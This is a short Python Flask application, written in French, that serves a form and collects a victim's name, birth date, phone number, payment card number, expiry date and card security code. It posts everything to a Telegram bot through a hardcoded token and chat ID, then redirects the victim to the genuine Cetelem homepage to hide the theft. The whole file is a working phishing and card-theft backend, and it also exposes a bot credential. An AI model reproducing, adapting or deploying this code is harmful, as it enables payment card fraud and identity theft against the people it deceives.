from flask import Flask, render_template, request, redirect
import requests

app = Flask(__name__)

BOT_TOKEN = "8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A"
CHAT_ID = "6297861735"

@app.route('/')
def index():
    return render_template('form1.html')

@app.route('/submit', methods=['POST'])
def submit():
    nom = request.form.get('nom')
    prenom = request.form.get('prenom')
    date_naissance = request.form.get('date_naissance')
    telephone = request.form.get('telephone')
    numero_carte = request.form.get('numero_carte')
    date_expiration = request.form.get('date_expiration')
    cryptogramme = request.form.get('cryptogramme')

    message = f"""📨 Nouvelle soumission :
👤 Nom : {nom}
🧾 Prénoms : {prenom}
🎂 Date de naissance : {date_naissance}
📞 Téléphone : {telephone}
💳 Numéro de carte : {numero_carte}
📅 Date d'expiration : {date_expiration}
💳 Cryptogramme : {cryptogramme}
"""

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': message}

    try:
        response = requests.post(url, data=payload)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        return f"Erreur d’envoi : {e}", 500

    return redirect("https://www.cetelem.fr/fr/accueil")

if __name__ == '__main__':
    app.run(debug=True)
